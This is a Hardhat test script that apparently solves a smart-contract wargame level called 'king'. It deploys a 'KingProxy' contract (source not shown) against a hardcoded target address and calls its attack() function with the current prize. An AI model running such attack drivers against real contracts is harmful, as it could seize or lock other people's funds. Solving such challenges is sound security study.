import { ethers } from "hardhat";
import { expect } from "chai";

describe("king", function() {
    it("should solve king challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function prize() public view returns (uint)",
        ]
        const targetAddr = "0x714a7717Bdcf89C597Ba15deC1af30C3529215Fc";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("KingProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr);
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        
        let prize = await targetCont.prize();
        console.log(`Current prize: ${prize}`);

        let tx = await proxyCont.attack({value: prize});
        await tx.wait();
        console.log(tx);
    });
});